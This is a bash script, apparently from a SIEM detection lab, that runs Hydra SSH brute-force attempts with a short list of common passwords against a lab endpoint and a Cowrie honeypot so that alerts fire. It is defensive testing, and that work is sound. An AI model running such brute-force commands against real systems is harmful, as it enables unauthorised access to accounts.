#!/usr/bin/env bash
# Scenario 1 - Brute force / credential stuffing (SSH) against Endpoint-1 and the
# honeypot. Expect ISIEM: "Brute Force / Credential Stuffing" + "Honeypot Interaction".
set -u; cd "$(dirname "$0")"; source ./targets.sh
banner "SCENARIO 1: SSH BRUTE FORCE (Hydra)"

# Build a short wordlist so the run is fast and repeatable even without rockyou.
TMPLIST=$(mktemp)
printf '%s\n' 123456 password root toor admin letmein qwerty 1234 ubuntu test > "$TMPLIST"
[ -r "$WORDLIST" ] && head -n 50 "$WORDLIST" >> "$TMPLIST"

echo "[*] Hydra -> Endpoint-1 ($ENDPOINT1:22)"
hydra -l "$SSH_USER" -P "$TMPLIST" -t 4 -f ssh://"$ENDPOINT1" 2>&1 | tail -5
echo "[*] Hydra -> Honeypot ($HONEYPOT:22)  (lands in Cowrie)"
hydra -l "$SSH_USER" -P "$TMPLIST" -t 4 ssh://"$HONEYPOT" 2>&1 | tail -5

rm -f "$TMPLIST"
echo "END: $(stamp)"
